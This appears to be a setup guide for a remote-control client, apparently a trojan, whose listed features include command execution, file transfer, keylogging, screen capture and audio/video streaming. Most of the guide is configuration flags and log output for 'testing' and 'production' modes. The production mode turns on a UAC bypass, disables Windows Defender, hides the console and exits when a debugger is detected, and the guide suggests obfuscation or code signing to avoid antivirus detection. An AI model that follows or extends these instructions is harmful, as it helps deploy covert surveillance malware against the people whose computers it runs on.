# 🧪 Testing Mode Configuration Guide

## Problem: Client Exits After Starting

If your client exits immediately after the UAC bypass attempt, it's because:
1. UAC bypass methods are being blocked by Windows security
2. Antivirus is flagging the UAC bypass as malicious
3. The program crashes when bypass fails

---

## ✅ Solution: Safe Testing Mode (RECOMMENDED)

Edit **client.py** around **line 162** and set these flags:

```python
# SAFE TESTING MODE - No aggressive actions
SKIP_BOOTSTRAP_UAC = True        # ✅ Skip UAC bypass on startup
SKIP_DEFENDER_DISABLE = True     # ✅ Skip Defender disable on startup
KEEP_SYSTEM_TOOLS_ENABLED = True # ✅ Keep CMD/Registry/TaskMgr enabled
```

---

## 🔧 Configuration Flags Explained

### Testing Mode (Default - SAFE)
```python
SILENT_MODE = False                  # Show console output
DEBUG_MODE = True                    # Enable debug logging
SKIP_BOOTSTRAP_UAC = True            # ✅ Skip UAC bypass on startup
SKIP_DEFENDER_DISABLE = True         # ✅ Skip Defender disable
KEEP_SYSTEM_TOOLS_ENABLED = True     # ✅ Keep system tools enabled
ENABLE_ANTI_ANALYSIS = False         # Don't exit on debugger detection
DISABLE_UAC_BYPASS = False           # Allow UAC bypass (but don't auto-run)
```

### Production Mode (AGGRESSIVE - Use with caution)
```python
SILENT_MODE = True                   # Hide console output
DEBUG_MODE = False                   # Disable debug logging
SKIP_BOOTSTRAP_UAC = False           # ⚠️ Enable UAC bypass on startup
SKIP_DEFENDER_DISABLE = False        # ⚠️ Enable Defender disable
KEEP_SYSTEM_TOOLS_ENABLED = True     # Still keep tools enabled
ENABLE_ANTI_ANALYSIS = True          # Exit if debugger detected
DISABLE_UAC_BYPASS = False           # Allow all UAC bypasses
```

---

## 🚀 What Happens in Testing Mode

When you run `python client.py` with testing mode enabled:

```
[STARTUP] Step 1: Bootstrap UAC bypass SKIPPED (SKIP_BOOTSTRAP_UAC = True)
[STARTUP] ℹ️ Running in safe testing mode
[STARTUP] ✅ Agent will continue with current user privileges

[STARTUP] Step 2: Defender disable SKIPPED (SKIP_DEFENDER_DISABLE = True)
[STARTUP] ℹ️ Running in safe testing mode

[STARTUP] Step 3: Disabling Windows notifications...
[STARTUP] === SYSTEM CONFIGURATION COMPLETE ===
[STARTUP] Connecting to controller...
```

The client will:
- ✅ Start successfully
- ✅ Connect to the controller
- ✅ NOT exit unexpectedly
- ✅ NOT trigger antivirus warnings
- ✅ Wait for commands from the controller
- ✅ Keep your CMD, PowerShell, Registry, Task Manager enabled

---

## ⚠️ Expected Warnings (Safe to Ignore)

### 1. uvloop Warning
```
⚠️ uvloop import FAILED: No module named 'uvloop'
USING STANDARD ASYNCIO
```
**Why:** uvloop doesn't work on Windows (Linux/macOS only)  
**Impact:** None - uses standard asyncio which works great on Windows

### 2. FastAPI Warning
```
⚠️ FastAPI/Uvicorn not available. Controller functionality disabled.
```
**Why:** This is a client, not a controller  
**Impact:** None - expected behavior

---

## 🔄 Switching Between Modes

### To Enable Aggressive Mode (Production):
1. Open `client.py` in a text editor
2. Find lines ~162-163
3. Change:
   ```python
   SKIP_BOOTSTRAP_UAC = False
   SKIP_DEFENDER_DISABLE = False
   ```
4. **Run as Administrator** for full privileges
5. **Caution:** May trigger antivirus

### To Return to Safe Mode (Testing):
1. Open `client.py`
2. Change back to:
   ```python
   SKIP_BOOTSTRAP_UAC = True
   SKIP_DEFENDER_DISABLE = True
   ```
3. Can run as normal user

---

## 📊 Feature Availability by Mode

| Feature | Testing Mode | Production Mode |
|---------|-------------|-----------------|
| Connect to controller | ✅ Yes | ✅ Yes |
| Execute commands | ✅ Yes | ✅ Yes |
| File transfer | ✅ Yes | ✅ Yes |
| Screen capture | ✅ Yes | ✅ Yes |
| Keylogging | ✅ Yes | ✅ Yes |
| Audio/video streaming | ✅ Yes | ✅ Yes |
| **Auto UAC bypass** | ❌ Disabled | ✅ Enabled |
| **Auto Defender disable** | ❌ Disabled | ✅ Enabled |
| **System tools** | ✅ Enabled | ✅ Enabled |
| **Triggers antivirus** | ❌ No | ⚠️ Likely |

---

## 🛡️ Antivirus Considerations

### Testing Mode:
- Low detection risk
- Most antivirus won't flag it
- Good for development and testing

### Production Mode:
- **High detection risk**
- UAC bypass triggers most antivirus
- Defender disable gets flagged
- Consider obfuscation or code signing

---

## 🧪 Quick Test

After configuring testing mode, verify it works:

```bash
# 1. Start the client
python client.py

# 2. You should see:
# [STARTUP] Bootstrap UAC bypass SKIPPED ✅
# [STARTUP] Defender disable SKIPPED ✅
# [STARTUP] Connecting to controller...

# 3. Client should stay running and wait for commands
```

If it exits immediately, check:
- Are the flags set correctly?
- Is antivirus still blocking it?
- Check the last error message

---

## 💡 Tips

1. **Always test in Testing Mode first** before switching to Production Mode
2. **Testing Mode is perfect for development** - no UAC prompts, no antivirus alerts
3. **Production Mode should only be used** when you understand the risks
4. **Keep backups** of your configuration before changing flags
5. **Your system tools** (CMD, PowerShell, Registry, Task Manager) stay enabled in both modes

---

## 🆘 Troubleshooting

### Client still exits?
- Check if SKIP_BOOTSTRAP_UAC = True
- Check if SKIP_DEFENDER_DISABLE = True  
- Look for error messages before exit
- Check antivirus logs

### Can't connect to controller?
- Verify controller URL in client.py
- Check network/firewall settings
- Look for Socket.IO connection errors

### Features not working?
- Some features may need admin privileges
- Check specific error messages
- Most features work fine without admin

---

**Default configuration is now set to TESTING MODE for your safety and convenience!** ✅
